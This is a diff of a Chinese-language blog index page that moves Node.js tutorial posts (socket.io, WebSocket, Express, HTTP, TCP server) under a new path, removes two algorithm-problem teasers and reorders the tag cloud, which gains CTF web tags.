+      <a class="article-more-a" href="/2020/09/29/nodeJs/12.%20redis/">展开全文 >></a>
     </p>
     
 
@@ -276,7 +576,7 @@
 
 
   
-    <article id="post-11. socket.io" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-nodeJs/11. socket.io" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
@@ -284,7 +584,7 @@
   
     <h1 itemprop="name">
 	
-	  <a class="article-title" href="/2020/09/29/11.%20socket.io/" target="_blank">11.Socket.io</a>
+	  <a class="article-title" href="/2020/09/29/nodeJs/11.%20socket.io/" target="_blank">11.Socket.io</a>
   
     </h1>
   
@@ -292,7 +592,7 @@
 
   
   
-<a href="/2020/09/29/11.%20socket.io/" class="archive-article-date">
+<a href="/2020/09/29/nodeJs/11.%20socket.io/" class="archive-article-date">
         <time datetime="2020-09-29T11:16:24.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-29</time>
 </a>
 
@@ -311,7 +611,7 @@
 </blockquote>
 <h1 id="聊天程序"><a href="#聊天程序" class="headerlink" title="聊天程序"></a>聊天程序</h1><h2 id="初始化程序"><a href="#初始化程序" class="headerlink" title="初始化程序"></a>初始化程序</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"name"</span>: <span class="string">"chat.io"</span>,</span><br><span class="line">    <span class="attr">"version"</span>: <span class="string">"0.0.1"</span>,</span><br><span class="line">    <span class="attr">"dependencies"</span>: &#123;</span><br><span class="line">        <span class="attr">"body-parser"</span>: <span class="string">"^1.19.0"</span>,</span><br><span class="line">        <span class="attr">"express"</span>: <span class="string">"^4.17.1"</span>,</span><br><span class="line">        <span class="attr">"socket.io"</span>: <span class="string">"^2.3.0"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
     
-    <a class="article-more-a" href="/2020/09/29/11.%20socket.io/#more">more >></a>
+    <a class="article-more-a" href="/2020/09/29/nodeJs/11.%20socket.io/#more">more >></a>
     
     
 
@@ -342,7 +642,7 @@
 
     
     <p class="article-more-link">
-      <a class="article-more-a" href="/2020/09/29/11.%20socket.io/">展开全文 >></a>
+      <a class="article-more-a" href="/2020/09/29/nodeJs/11.%20socket.io/">展开全文 >></a>
     </p>
     
 
@@ -372,7 +672,7 @@
 
 
   
-    <article id="post-10. WebSocket" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-nodeJs/10. WebSocket" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
@@ -380,7 +680,7 @@
   
     <h1 itemprop="name">
 	
-	  <a class="article-title" href="/2020/09/29/10.%20WebSocket/" target="_blank">10.WebSocket</a>
+	  <a class="article-title" href="/2020/09/29/nodeJs/10.%20WebSocket/" target="_blank">10.WebSocket</a>
   
     </h1>
   
@@ -388,7 +688,7 @@
 
   
   
-<a href="/2020/09/29/10.%20WebSocket/" class="archive-article-date">
+<a href="/2020/09/29/nodeJs/10.%20WebSocket/" class="archive-article-date">
         <time datetime="2020-09-29T11:15:24.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-29</time>
 </a>
 
@@ -413,7 +713,7 @@
 <p><strong>服务端</strong></p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> WebSocketServer = <span class="built_in">require</span>(<span class="string">'ws'</span>).Server;</span><br><span class="line"><span class="keyword">var</span> wss = <span class="keyword">new</span> WebSocketServer(&#123;<span class="attr">port</span>: <span class="number">8181</span>&#125;);</span><br><span class="line">wss.on(<span class="string">'connection'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">ws</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'服务器端：客户端已连接'</span>);</span><br><span class="line">    ws.on(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">message</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(message);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
     
-    <a class="article-more-a" href="/2020/09/29/10.%20WebSocket/#more">more >></a>
+    <a class="article-more-a" href="/2020/09/29/nodeJs/10.%20WebSocket/#more">more >></a>
     
     
 
@@ -444,7 +744,7 @@
 
     
     <p class="article-more-link">
-      <a class="article-more-a" href="/2020/09/29/10.%20WebSocket/">展开全文 >></a>
+      <a class="article-more-a" href="/2020/09/29/nodeJs/10.%20WebSocket/">展开全文 >></a>
     </p>
     
 
@@ -474,7 +774,7 @@
 
 
   
-    <article id="post-9. express" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-nodeJs/9. express" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
@@ -482,7 +782,7 @@
   
     <h1 itemprop="name">
 	
-	  <a class="article-title" href="/2020/09/29/9.%20express/" target="_blank">9.Express</a>
+	  <a class="article-title" href="/2020/09/29/nodeJs/9.%20express/" target="_blank">9.Express</a>
   
     </h1>
   
@@ -490,7 +790,7 @@
 
   
   
-<a href="/2020/09/29/9.%20express/" class="archive-article-date">
+<a href="/2020/09/29/nodeJs/9.%20express/" class="archive-article-date">
         <time datetime="2020-09-29T11:14:24.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-29</time>
 </a>
 
@@ -505,7 +805,7 @@
     
     <h1 id="Express"><a href="#Express" class="headerlink" title="Express"></a>Express</h1><h2 id="一个小型express应用"><a href="#一个小型express应用" class="headerlink" title="一个小型express应用"></a><strong>一个小型express应用</strong></h2><h3 id="创建模块"><a href="#创建模块" class="headerlink" title="创建模块"></a>创建模块</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"name"</span>: <span class="string">"express-tweet"</span>,</span><br><span class="line">    <span class="attr">"version"</span>: <span class="string">"0.0.1"</span>,</span><br><span class="line">    <span class="attr">"dependencies"</span>: &#123;</span><br><span class="line">        <span class="attr">"express"</span>: <span class="string">"*"</span>,</span><br><span class="line">        <span class="attr">"ejs"</span>: <span class="string">"*"</span>,</span><br><span class="line">        <span class="attr">"superagent"</span>: <span class="string">"*"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
     
-    <a class="article-more-a" href="/2020/09/29/9.%20express/#more">more >></a>
+    <a class="article-more-a" href="/2020/09/29/nodeJs/9.%20express/#more">more >></a>
     
     
 
@@ -536,7 +836,7 @@
 
     
     <p class="article-more-link">
-      <a class="article-more-a" href="/2020/09/29/9.%20express/">展开全文 >></a>
+      <a class="article-more-a" href="/2020/09/29/nodeJs/9.%20express/">展开全文 >></a>
     </p>
     
 
@@ -566,7 +866,7 @@
 
 
   
-    <article id="post-8. connect 中间件" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-nodeJs/8. connect 中间件" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
@@ -574,7 +874,7 @@
   
     <h1 itemprop="name">
 	
-	  <a class="article-title" href="/2020/09/29/8.%20connect%20%E4%B8%AD%E9%97%B4%E4%BB%B6/" target="_blank">8.connect</a>
+	  <a class="article-title" href="/2020/09/29/nodeJs/8.%20connect%20%E4%B8%AD%E9%97%B4%E4%BB%B6/" target="_blank">8.connect</a>
   
     </h1>
   
@@ -582,7 +882,7 @@
 
   
   
-<a href="/2020/09/29/8.%20connect%20%E4%B8%AD%E9%97%B4%E4%BB%B6/" class="archive-article-date">
+<a href="/2020/09/29/nodeJs/8.%20connect%20%E4%B8%AD%E9%97%B4%E4%BB%B6/" class="archive-article-date">
         <time datetime="2020-09-29T11:13:24.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-29</time>
 </a>
 
@@ -599,7 +899,7 @@
 <p>基于HTTP服务器的工具集，提供了一种新的组织代码的方式来与请求，响应对象进行交互，称中间件(middleware)</p>
 </blockquote>
     
-    <a class="article-more-a" href="/2020/09/29/8.%20connect%20%E4%B8%AD%E9%97%B4%E4%BB%B6/#more">more >></a>
+    <a class="article-more-a" href="/2020/09/29/nodeJs/8.%20connect%20%E4%B8%AD%E9%97%B4%E4%BB%B6/#more">more >></a>
     
     
 
@@ -630,7 +930,7 @@
 
     
     <p class="article-more-link">
-      <a class="article-more-a" href="/2020/09/29/8.%20connect%20%E4%B8%AD%E9%97%B4%E4%BB%B6/">展开全文 >></a>
+      <a class="article-more-a" href="/2020/09/29/nodeJs/8.%20connect%20%E4%B8%AD%E9%97%B4%E4%BB%B6/">展开全文 >></a>
     </p>
     
 
@@ -660,7 +960,7 @@
 
 
   
-    <article id="post-7. HTTP" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-nodeJs/7. HTTP" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
@@ -668,7 +968,7 @@
   
     <h1 itemprop="name">
 	
-	  <a class="article-title" href="/2020/09/29/7.%20HTTP/" target="_blank">7.HTTP --TCP上层的超文本传输协议</a>
+	  <a class="article-title" href="/2020/09/29/nodeJs/7.%20HTTP/" target="_blank">7.HTTP --TCP上层的超文本传输协议</a>
   
     </h1>
   
@@ -676,7 +976,7 @@
 
   
   
-<a href="/2020/09/29/7.%20HTTP/" class="archive-article-date">
+<a href="/2020/09/29/nodeJs/7.%20HTTP/" class="archive-article-date">
         <time datetime="2020-09-29T11:12:24.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-29</time>
 </a>
 
@@ -696,7 +996,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP / 1.1 200 OK</span><br><span class="line">Date: Mon, 31 Aug 2020 22: 57: 14 GMT</span><br><span class="line">Connection: keep - alive</span><br><span class="line">Transfer - Encoding: chunked</span><br><span class="line">b</span><br><span class="line">Hello World</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
 </blockquote>
     
-    <a class="article-more-a" href="/2020/09/29/7.%20HTTP/#more">more >></a>
+    <a class="article-more-a" href="/2020/09/29/nodeJs/7.%20HTTP/#more">more >></a>
     
     
 
@@ -727,7 +1027,7 @@
 
     
     <p class="article-more-link">
-      <a class="article-more-a" href="/2020/09/29/7.%20HTTP/">展开全文 >></a>
+      <a class="article-more-a" href="/2020/09/29/nodeJs/7.%20HTTP/">展开全文 >></a>
     </p>
     
 
@@ -757,7 +1057,7 @@
 
 
   
-    <article id="post-6. TCP服务器 在线聊天应用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-nodeJs/6. TCP服务器 在线聊天应用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
@@ -765,7 +1065,7 @@
   
     <h1 itemprop="name">
 	
-	  <a class="article-title" href="/2020/09/29/6.%20TCP%E6%9C%8D%E5%8A%A1%E5%99%A8%20%E5%9C%A8%E7%BA%BF%E8%81%8A%E5%A4%A9%E5%BA%94%E7%94%A8/" target="_blank">6.TCP服务器</a>
+	  <a class="article-title" href="/2020/09/29/nodeJs/6.%20TCP%E6%9C%8D%E5%8A%A1%E5%99%A8%20%E5%9C%A8%E7%BA%BF%E8%81%8A%E5%A4%A9%E5%BA%94%E7%94%A8/" target="_blank">6.TCP服务器</a>
   
     </h1>
   
@@ -773,7 +1073,7 @@
 
   
   
-<a href="/2020/09/29/6.%20TCP%E6%9C%8D%E5%8A%A1%E5%99%A8%20%E5%9C%A8%E7%BA%BF%E8%81%8A%E5%A4%A9%E5%BA%94%E7%94%A8/" class="archive-article-date">
+<a href="/2020/09/29/nodeJs/6.%20TCP%E6%9C%8D%E5%8A%A1%E5%99%A8%20%E5%9C%A8%E7%BA%BF%E8%81%8A%E5%A4%A9%E5%BA%94%E7%94%A8/" class="archive-article-date">
         <time datetime="2020-09-29T11:11:24.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-29</time>
 </a>
 
@@ -789,7 +1089,7 @@
     <h1 id="TCP服务器"><a href="#TCP服务器" class="headerlink" title="TCP服务器"></a>TCP服务器</h1><hr>
 <h2 id="创建TCP服务器-使用telnet测试"><a href="#创建TCP服务器-使用telnet测试" class="headerlink" title="创建TCP服务器 使用telnet测试"></a>创建TCP服务器 使用telnet测试</h2><h3 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">'http'</span>).createServer(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'text/html'</span>&#125;);</span><br><span class="line">    res.end(<span class="string">'&lt;h1&gt;hello world&lt;/h1&gt;'</span>);</span><br><span class="line">&#125;).listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure>
     
-    <a class="article-more-a" href="/2020/09/29/6.%20TCP%E6%9C%8D%E5%8A%A1%E5%99%A8%20%E5%9C%A8%E7%BA%BF%E8%81%8A%E5%A4%A9%E5%BA%94%E7%94%A8/#more">more >></a>
+    <a class="article-more-a" href="/2020/09/29/nodeJs/6.%20TCP%E6%9C%8D%E5%8A%A1%E5%99%A8%20%E5%9C%A8%E7%BA%BF%E8%81%8A%E5%A4%A9%E5%BA%94%E7%94%A8/#more">more >></a>
     
     
 
@@ -820,7 +1120,7 @@
 
     
     <p class="article-more-link">
-      <a class="article-more-a" href="/2020/09/29/6.%20TCP%E6%9C%8D%E5%8A%A1%E5%99%A8%20%E5%9C%A8%E7%BA%BF%E8%81%8A%E5%A4%A9%E5%BA%94%E7%94%A8/">展开全文 >></a>
+      <a class="article-more-a" href="/2020/09/29/nodeJs/6.%20TCP%E6%9C%8D%E5%8A%A1%E5%99%A8%20%E5%9C%A8%E7%BA%BF%E8%81%8A%E5%A4%A9%E5%BA%94%E7%94%A8/">展开全文 >></a>
     </p>
     
 
@@ -850,7 +1150,7 @@
 
 
   
-    <article id="post-5. CLI以及FS API 第一个node.js程序 - 命令行程序" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-nodeJs/5. CLI以及FS API 第一个node.js程序 - 命令行程序" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
@@ -858,7 +1158,7 @@
   
     <h1 itemprop="name">
 	
-	  <a class="article-title" href="/2020/09/29/5.%20CLI%E4%BB%A5%E5%8F%8AFS%20API%20%E7%AC%AC%E4%B8%80%E4%B8%AAnode.js%E7%A8%8B%E5%BA%8F%20-%20%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%A8%8B%E5%BA%8F/" target="_blank">5.CLI以及FS API</a>
+	  <a class="article-title" href="/2020/09/29/nodeJs/5.%20CLI%E4%BB%A5%E5%8F%8AFS%20API%20%E7%AC%AC%E4%B8%80%E4%B8%AAnode.js%E7%A8%8B%E5%BA%8F%20-%20%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%A8%8B%E5%BA%8F/" target="_blank">5.CLI以及FS API</a>
   
     </h1>
   
@@ -866,7 +1166,7 @@
 
   
   
-<a href="/2020/09/29/5.%20CLI%E4%BB%A5%E5%8F%8AFS%20API%20%E7%AC%AC%E4%B8%80%E4%B8%AAnode.js%E7%A8%8B%E5%BA%8F%20-%20%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%A8%8B%E5%BA%8F/" class="archive-article-date">
+<a href="/2020/09/29/nodeJs/5.%20CLI%E4%BB%A5%E5%8F%8AFS%20API%20%E7%AC%AC%E4%B8%80%E4%B8%AAnode.js%E7%A8%8B%E5%BA%8F%20-%20%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%A8%8B%E5%BA%8F/" class="archive-article-date">
         <time datetime="2020-09-29T11:10:24.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-29</time>
 </a>
 
@@ -906,7 +1206,7 @@
 4. 选择某个目录后，显示该目录下的信息
 5. 运行结束后程序退出</code></pre>
     
-    <a class="article-more-a" href="/2020/09/29/5.%20CLI%E4%BB%A5%E5%8F%8AFS%20API%20%E7%AC%AC%E4%B8%80%E4%B8%AAnode.js%E7%A8%8B%E5%BA%8F%20-%20%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%A8%8B%E5%BA%8F/#more">more >></a>
+    <a class="article-more-a" href="/2020/09/29/nodeJs/5.%20CLI%E4%BB%A5%E5%8F%8AFS%20API%20%E7%AC%AC%E4%B8%80%E4%B8%AAnode.js%E7%A8%8B%E5%BA%8F%20-%20%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%A8%8B%E5%BA%8F/#more">more >></a>
     
     
 
@@ -937,204 +1237,7 @@
 
     
     <p class="article-more-link">
-      <a class="article-more-a" href="/2020/09/29/5.%20CLI%E4%BB%A5%E5%8F%8AFS%20API%20%E7%AC%AC%E4%B8%80%E4%B8%AAnode.js%E7%A8%8B%E5%BA%8F%20-%20%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%A8%8B%E5%BA%8F/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" target="_blank" rel="noopener" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Question-P2536" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2020/03/02/Question-P2536/" target="_blank">Question-P2536</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2020/03/02/Question-P2536/" class="archive-article-date">
-        <time datetime="2020-03-02T08:52:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-02</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>科学家们在Samuel星球上的探险仍在继续。非常幸运的，在Samuel星球的南极附近，探险机器人发现了一个巨大的冰湖！机器人在这个冰湖中搜集到了许多RNA片段运回了实验基地。</p>
-<p>科学家们经过几个昼夜的研究，发现这些RNA片段中有许多是未知的病毒！</p>
-<p>每个RNA片段都是由A、C、T、G组成的序列。科学家们也总结出了Samuel星球上的“病毒模版片段”。一个模版片段是由A、C、T、G的序列加上通配符 * 和 ? 来表示。其中 * 的意思是可以匹配上0个或任意多个字符，而 ? 的意思是匹配上任意一个字母。</p>
-<p>如果一个RNA片段能够和“病毒模版片段”相匹配，那么这个RNA片段就是未知的病毒。</p>
-<p>例如，假设“病毒模版片段”为A*G?C。RNA片段：AGTC，AGTGTC都是未知的病毒，而RNA片段AGTGC则不是病毒。</p>
-<p>由于，机器人搜集的这些RNA片段中除去病毒的其他部分都具有非常高的研究价值。所以科学家们希望能够分辨出其中哪些RNA片段不是病毒，并将不是病毒的RNA片段运回宇宙空间站继续进行研究。</p>
-<p>科学家将这项任务交给了小联。现在请你为小联编写程序统计哪些RNA片段不是病毒。</p>
-    
-    <a class="article-more-a" href="/2020/03/02/Question-P2536/#more">more >></a>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color4">Question</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color3">暴力</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2020/03/02/Question-P2536/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" target="_blank" rel="noopener" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Question-P2292" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2020/02/27/Question-P2292/" target="_blank">Question-P2292</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2020/02/27/Question-P2292/" class="archive-article-date">
-        <time datetime="2020-02-27T12:44:53.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-27</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h1 id="P2292"><a href="#P2292" class="headerlink" title="P2292"></a>P2292</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>标点符号的出现晚于文字的出现，所以以前的语言都是没有标点的。现在你要处理的就是一段没有标点的文章。</p>
-<p>一段文章T是由若干小写字母构成。一个单词W也是由若干小写字母构成。一个字典D是若干个单词的集合。我们称一段文章T在某个字典D下是可以被理解的，是指如果文章T可以被分成若干部分，且每一个部分都是字典D中的单词。</p>
-<p>例如字典D中包括单词{‘is’, ‘name’, ‘what’, ‘your’}，则文章‘whatisyourname’是在字典D下可以被理解的，因为它可以分成4个单词：‘what’, ‘is’, ‘your’, ‘name’，且每个单词都属于字典D，而文章‘whatisyouname’在字典D下不能被理解，但可以在字典D’=D+{‘you’}下被理解。这段文章的一个前缀‘whatis’，也可以在字典D下被理解，而且是在字典D下能够被理解的最长的前缀。</p>
-<p>给定一个字典D，你的程序需要判断若干段文章在字典D下是否能够被理解。并给出其在字典D下能够被理解的最长前缀的位置。</p>
-    
-    <a class="article-more-a" href="/2020/02/27/Question-P2292/#more">more >></a>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color4">Question</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color5">动态规划</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color4">字典树</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2020/02/27/Question-P2292/">展开全文 >></a>
+      <a class="article-more-a" href="/2020/09/29/nodeJs/5.%20CLI%E4%BB%A5%E5%8F%8AFS%20API%20%E7%AC%AC%E4%B8%80%E4%B8%AAnode.js%E7%A8%8B%E5%BA%8F%20-%20%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%A8%8B%E5%BA%8F/">展开全文 >></a>
     </p>
     
 
@@ -1318,14 +1421,6 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color2">深度优先搜索</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color4">Question</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color3">容斥</a>
               </li>
              
@@ -1338,15 +1433,15 @@
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color4">Question</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color4">并查集</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color2">堆</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color5">数据结构</a>
+                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color2">深度优先搜索</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1358,15 +1453,31 @@
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color2">堆</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color5">数据结构</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color1">最小生成树</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color3">ctf-web</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color2">CTF笔记-WEB攻防</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color3">模拟</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color4">字典树</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color1">最小生成树</a>
               </li>
              
               <li class="article-tag-list-item">
